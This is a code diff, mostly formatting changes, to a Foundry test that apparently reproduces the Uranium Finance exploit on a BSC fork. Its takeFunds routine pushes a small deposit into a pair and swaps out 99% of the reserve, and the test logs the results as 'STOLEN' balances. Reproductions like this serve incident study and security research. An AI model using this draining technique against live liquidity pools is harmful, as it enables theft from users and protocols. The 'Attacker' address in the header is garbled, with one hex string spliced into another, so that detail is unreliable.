@@ -6,7 +6,7 @@ import "./interface.sol";
 
 // @KeyInfo - Total Lost : $50 M
 // Attacker : 0xd9936EA91a461aA4B727a7e0xc47bdd0a852a88a019385ea3ff57cf8de79f019d3661bcD6cD257481c
-// AttackContract : 0x2b528a28451e9853f51616f3b0f6d82af8bea6ae 
+// AttackContract : 0x2b528a28451e9853f51616f3b0f6d82af8bea6ae
 // Txhash : https://bscscan.com/tx/0x5a504fe72ef7fc76dfeb4d979e533af4e23fe37e90b5516186d5787893c37991
 
 // REF: https://twitter.com/FrankResearcher/status/1387347025742557186
@@ -33,13 +33,13 @@ interface IWrappedNative {
 
 contract Exploit is Test {
     function setUp() public {
-        cheat.createSelectFork("bsc", 6920000);
+        cheat.createSelectFork("bsc", 6_920_000);
     }
 
     function testExploit() public {
         wrap();
-        takeFunds(wbnb, busd, 1 ether); 
-        takeFunds(busd, wbnb, 1 ether); 
+        takeFunds(wbnb, busd, 1 ether);
+        takeFunds(busd, wbnb, 1 ether);
         console.log("BUSD STOLEN : ", IERC20(busd).balanceOf(address(this)));
         console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(address(this)));
     }
@@ -49,12 +49,12 @@ contract Exploit is Test {
         console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(this)));
     }
 
-    function takeFunds(address token0, address token1, uint amount) internal {
+    function takeFunds(address token0, address token1, uint256 amount) internal {
         IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
         IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(token1), address(token0)));
 
         IERC20(token0).transfer(address(pair), amount);
-        uint amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;
+        uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;
 
         pair.swap(
             pair.token0() == address(token1) ? amountOut : 0,
